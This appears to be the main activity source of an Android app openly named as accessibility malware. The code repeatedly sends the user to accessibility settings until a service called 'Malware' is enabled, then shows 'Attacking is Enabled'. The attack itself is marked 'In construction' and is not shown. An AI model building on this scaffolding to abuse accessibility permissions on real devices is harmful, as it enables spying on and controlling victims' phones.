package com.hackinghell.accessmalware;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;
import android.widget.Toast;

import com.hackinghell.accessmalware.databinding.ActivityMainBinding;

import java.util.Collection;
import java.util.Collections;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class MainActivity extends AppCompatActivity {

    private boolean loginState = true;

    private TextView textView;

    public static boolean isMainActivityVisible = false;

    // Used to load the 'accessmalware' library on application startup.
    static {
        System.loadLibrary("accessmalware");
    }

    private ActivityMainBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);



        if (loginState) {
            binding = ActivityMainBinding.inflate(getLayoutInflater());
            setContentView(binding.getRoot());
        } else {
            Intent intent = new Intent(this, LoginActivity.class);
            startActivity(intent);
        }

        Retrofit retrofit= new Retrofit.Builder()
                .baseUrl("https://jsonplaceholder.typicode.com/")
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        acess myAccessAPI = retrofit.create(acess.class);

        Call<Void> call = myAccessAPI.successGet();
        call.enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    System.out.println("GET request successful!");
                } else {
                    System.out.println("GET request failed with status code: " + response.code());
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                System.out.println("GET request failed: " + t.getMessage());
            }
        });

        textView = binding.textView;

        if (!isAccessServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        } else {
            textView.setText("Attacking is Enabled");
            binding.button.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Toast.makeText(MainActivity.this, "Proceed with Attack ( In Construction )", Toast.LENGTH_SHORT).show();
                }
            });
        }

        isMainActivityVisible = true;

    }

    @Override
    protected void onStart() {
        super.onStart();
        isMainActivityVisible = true;
    }

    @Override
    protected void onStop() {
        super.onStop();
        isMainActivityVisible = false;
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (!isAccessServiceEnabled()) {
            textView.setText("Accessibility not enable");
            binding.button.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Toast.makeText(MainActivity.this, "Enable the Accessibility Setting Malware", Toast.LENGTH_SHORT).show();
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    startActivity(intent);
                }
            });
        } else {
            textView.setText("Attacking is Enabled");
            binding.button.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Toast.makeText(MainActivity.this, "In construction", Toast.LENGTH_SHORT).show();
                }
            });
        }
        isMainActivityVisible = true;
    }

    @Override
    protected void onPause() {
        super.onPause();
        isMainActivityVisible = false;
    }

    private boolean isAccessServiceEnabled() {
        int accessEnabled = 0;
        final String service = getPackageName() + "/" + Malware.class.getCanonicalName();
        //System.out.println(service);
        try {
            accessEnabled = Settings.Secure.getInt(getContentResolver(),
                            Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        if (accessEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return settingValue != null && settingValue.contains(service);
        }
        return false;
    }

    /**
     * A native method that is implemented by the 'accessmalware' native library,
     * which is packaged with this application.
     */
    public native String stringFromJNI();
}